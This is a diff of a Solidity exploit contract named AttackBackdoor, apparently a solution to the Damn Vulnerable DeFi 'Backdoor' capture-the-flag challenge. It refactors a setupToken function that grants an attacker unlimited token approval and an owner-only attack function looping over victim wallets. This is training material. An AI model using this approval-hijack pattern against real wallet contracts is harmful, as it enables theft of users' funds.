@@ -14,30 +14,19 @@ contract AttackBackdoor {
     address _masterCopy;
     address _walletRegistry;
 
-    constructor(
-        address owner,
-        address masterCopy,
-        address token,
-        address factory,
-        address walletRegistry,
-        address[] memory vitims,
-        bytes memory data
-    ) {
+    constructor(address owner, address masterCopy, address token, address factory, address walletRegistry) {
         _owner = owner;
         _token = DamnValuableToken(token);
         _masterCopy = masterCopy;
         _factory = factory;
         _walletRegistry = walletRegistry;
-        _token.approve(_owner, type(uint256).max);
-
-        attack(vitims, data);
     }
 
-    function setupToken() external {
-        _token.approve(address(_owner), type(uint256).max);
+    function setupToken(address token, address attacker) external {
+        DamnValuableToken(token).approve(address(attacker), type(uint256).max);
     }
 
-    function attack(address[] memory vitims, bytes memory data) public {
+    function attack(address[] memory vitims, bytes memory data) external {
         require(msg.sender == _owner, "not owner");
 
         for (uint256 i = 0; i < vitims.length; i++) {
